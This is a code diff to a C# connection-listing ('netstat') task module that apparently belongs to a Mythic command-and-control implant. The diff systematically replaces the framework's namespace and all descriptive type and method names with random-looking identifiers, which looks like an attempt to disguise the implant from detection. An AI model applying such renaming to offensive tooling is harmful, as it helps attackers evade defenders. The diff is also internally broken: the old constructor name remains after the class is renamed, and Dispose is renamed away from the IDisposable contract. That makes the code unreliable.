@@ -6,9 +6,9 @@
 
 #if NETSTAT
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -17,14 +17,14 @@ using System.Net.NetworkInformation;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
-using ApolloInterop.Classes.Api;
+using PhantomInterop.Classes.Api;
 
 namespace Tasks
 {
-    public class netstat : Tasking
+    public class AdaptiveValidator79BA : Tasking
     {
         [DataContract()]
-        private struct NetstatEntry {
+        private struct StrategicMonitor5197 {
             [DataMember(Name = "local_address")] public string LocalAddress;
             [DataMember(Name = "remote_address")] public string RemoteAddress;
             [DataMember(Name = "local_port")] public int LocalPort;
@@ -36,7 +36,7 @@ namespace Tasks
         }
 
         [DataContract()]
-        private struct NetstatParameters {
+        private struct SecureAdapter51CE {
             [DataMember(Name = "tcp")] public bool Tcp;
             [DataMember(Name = "udp")] public bool Udp;
             [DataMember(Name = "established")] public bool Established;
@@ -94,7 +94,7 @@ namespace Tasks
         #region structs
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_UDP6ROW_OWNER_PID
+        public struct ShadowBridgeF2A6
         {
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
             private byte[] localAddr;
@@ -113,7 +113,7 @@ namespace Tasks
         }
         
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_UDP6TABLE_OWNER_PID
+        public struct SpectreCoordinator337E
         {
             public uint dwNumEntries;
             [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
@@ -121,7 +121,7 @@ namespace Tasks
         }
         
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_UDPTABLE_OWNER_PID
+        public struct SecureCoordinatorB95F
         {
             public uint dwNumEntries;
             [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
@@ -129,7 +129,7 @@ namespace Tasks
         }
         
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_UDPROW_OWNER_PID
+        public struct RobustWorker5051
         {
             private uint localAddr;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
@@ -145,7 +145,7 @@ namespace Tasks
         
         // https://stackoverflow.com/a/577660
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_TCPROW_OWNER_PID
+        public struct DynamicResolverCB4F
         {
             private uint state;
             private uint localAddr;
@@ -174,7 +174,7 @@ namespace Tasks
         
         // https://msdn2.microsoft.com/en-us/library/aa366921.aspx
         [StructLayout(LayoutKind.Sequential)]
-        private struct MIB_TCPTABLE_OWNER_PID 
+        private struct RobustTransformer36D2 
         {
             public uint dwNumEntries;
             [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
@@ -183,7 +183,7 @@ namespace Tasks
 
         // https://www.pinvoke.net/default.aspx/Structures/MIB_TCP6ROW_OWNER_PID.html
         [StructLayout(LayoutKind.Sequential)]
-        public struct MIB_TCP6ROW_OWNER_PID
+        public struct PhantomHandlerB6F1
         {
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
             private byte[] localAddr;
@@ -220,7 +220,7 @@ namespace Tasks
 
         // https://msdn.microsoft.com/en-us/library/windows/desktop/aa366905
         [StructLayout(LayoutKind.Sequential)]
-        private struct MIB_TCP6TABLE_OWNER_PID 
+        private struct FlexibleWorker45B9 
         {
             public uint dwNumEntries;
             [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
@@ -248,7 +248,7 @@ namespace Tasks
             throw new NotImplementedException();
         }
 
-        public class IConnectionWrapper : IDisposable 
+        public class CipherService834C : IDisposable 
         {
              private const int AF_INET = 2;    // IP_v4 = System.Net.Sockets.AddressFamily.InterNetwork
              private const int AF_INET6 = 23;  // IP_v6 = System.Net.Sockets.AddressFamily.InterNetworkV6
@@ -257,7 +257,7 @@ namespace Tasks
             public IConnectionWrapper() { }
 
             // Disposes of this wrapper
-            public void Dispose() 
+            public void SpectreWorkerD99D() 
             {
                 GC.SuppressFinalize(this);
             }
